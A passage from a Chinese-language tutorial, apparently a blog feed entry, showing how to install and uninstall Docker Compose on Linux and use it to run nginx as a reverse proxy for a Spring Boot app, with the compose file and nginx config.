<pre><code class="language-shell"># Compose目前已经完全支持Linux、Mac OS和Windows，在我们安装Compose之前，需要先安装Docker。下面我 们以编译好的二进制包方式安装在Linux系统中。 
curl -L https://github.com/docker/compose/releases/download/1.22.0/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose
# 设置文件可执行权限 
chmod +x /usr/local/bin/docker-compose
# 查看版本信息 
docker-compose -version
</code></pre>
<p>二、卸载Docker Compose</p>
<pre><code class="language-shell"># 二进制包方式安装的，删除二进制文件即可
rm /usr/local/bin/docker-compose
</code></pre>
<p>三、 使用docker compose编排nginx+springboot项目</p>
<ol>
<li>创建docker-compose目录</li>
</ol>
<pre><code class="language-shell">mkdir ~/docker-compose
cd ~/docker-compose
</code></pre>
<ol start="2">
<li>编写 docker-compose.yml 文件</li>
</ol>
<pre><code class="language-shell">version: '3'
services:
  nginx:
   image: nginx
   ports:
    - 80:80
   links:
    - app
   volumes:
    - ./nginx/conf.d:/etc/nginx/conf.d
  app:
    image: app
    expose:
      - &quot;8080&quot;
</code></pre>
<ol start="3">
<li>创建./nginx/conf.d目录</li>
</ol>
<pre><code class="language-shell">mkdir -p ./nginx/conf.d
</code></pre>
<ol start="4">
<li>在./nginx/conf.d目录下 编写itheima.conf文件</li>
</ol>
<pre><code class="language-shell">server {
    listen 80;
    access_log off;

    location / {
        proxy_pass http://app:8080;
    }
   
}
</code></pre>
<ol start="5">
<li>在~/docker-compose 目录下 使用docker-compose 启动容器</li>
</ol>
<pre><code class="language-shell">docker-compose up
</code></pre>
<ol start="6">
<li>测试访问</li>
</ol>
]]></content>
    </entry>
</feed>